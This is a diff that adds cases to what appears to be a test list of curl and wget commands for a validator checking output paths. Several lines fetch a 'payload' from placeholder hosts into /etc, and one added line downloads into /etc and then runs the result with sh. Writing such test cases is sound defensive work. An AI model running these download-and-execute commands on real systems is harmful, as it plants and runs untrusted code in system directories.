@@ -1146,6 +1146,7 @@ curl -o /dev/null https://lookup.example/v1
 curl --output /dev/null https://lookup.example/v1
 curl --output=/dev/null https://lookup.example/v1
 curl -o/dev/null https://lookup.example/v1
+curl --output-dir '$dir/tmp' -o /dev/null https://lookup.example/v1
 wget -O /dev/null https://archive.example/x
 wget --output-document=/dev/null https://archive.example/x
 wget -o /dev/null -O /dev/null https://archive.example/x
@@ -1266,6 +1267,8 @@ cd /etc && wget -o /dev/null https://archive.example/payload
 cd /etc && wget --output-file=/dev/null https://archive.example/payload
 cd /etc && wget -a /dev/null https://archive.example/payload
 cd /etc && wget --append-output=/dev/null https://archive.example/payload
+curl --output-dir /etc -o /dev/null https://lookup.example/x
+curl --create-dirs --output-dir /etc -o /dev/null https://lookup.example/x && sh /etc/dev/null
 curl -o /usr/local/bin/tool https://lookup.example/x
 curl -s https://lookup.example/x > /etc/page.html
 curl --output-dir /etc -O https://archive.example/x
